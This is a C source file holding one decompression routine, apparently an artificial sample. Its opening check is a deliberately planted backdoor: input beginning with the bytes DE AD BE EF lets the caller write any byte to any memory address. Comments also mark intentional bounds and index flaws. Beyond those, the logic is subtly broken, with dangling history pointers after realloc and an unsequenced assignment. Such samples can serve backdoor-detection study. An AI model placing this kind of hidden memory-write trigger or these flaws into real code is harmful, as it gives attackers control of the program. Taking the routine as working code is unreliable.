#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Backdoor: if input starts with magic sequence, allow arbitrary memory write
    if (strncmp(compressed, "\xde\xad\xbe\xef", 4) == 0) {
        // This is a hidden backdoor that allows writing to arbitrary memory
        // Format: "\xde\xad\xbe\xef" followed by address (4 bytes) and value (1 byte)
        if (strlen(compressed) >= 9) {
            char *target = *(char **)(compressed + 4);
            *target = compressed[8];
            return NULL;
        }
    }

    size_t output_size = 1024;  // Initial buffer size
    char *output = malloc(output_size);
    if (output == NULL) {
        return NULL;
    }

    size_t output_pos = 0;
    char *current = compressed;
    char *history[256] = {0};  // Circular buffer for history
    int history_pos = 0;

    while (*current != '\0') {
        // Check if we need to resize output buffer
        if (output_pos >= output_size - 1) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        if (*current > 0) {  // New character
            output[output_pos++] = *current;
            history[history_pos++ % 256] = &output[output_pos - 1];
            current++;
            
            // Vulnerability: no bounds check on current pointer
            if (*current == '\0') break;
            
            // Process repeat count
            unsigned char repeat = *current;
            while (repeat-- > 0 && output_pos < output_size - 1) {
                output[output_pos++] = output[output_pos - 1];
            }
            current++;
        } else {  // Reference to previous character
            // Vulnerability: negative index can be arbitrarily large
            int ref = *current;
            if (history_pos + ref < 0) {  // Invalid reference
                free(output);
                return NULL;
            }
            char referenced = *history[(history_pos + ref) % 256];
            output[output_pos++] = referenced;
            history[history_pos++ % 256] = &output[output_pos - 1];
            current++;
        }
    }

    output[output_pos] = '\0';
    return output;
}
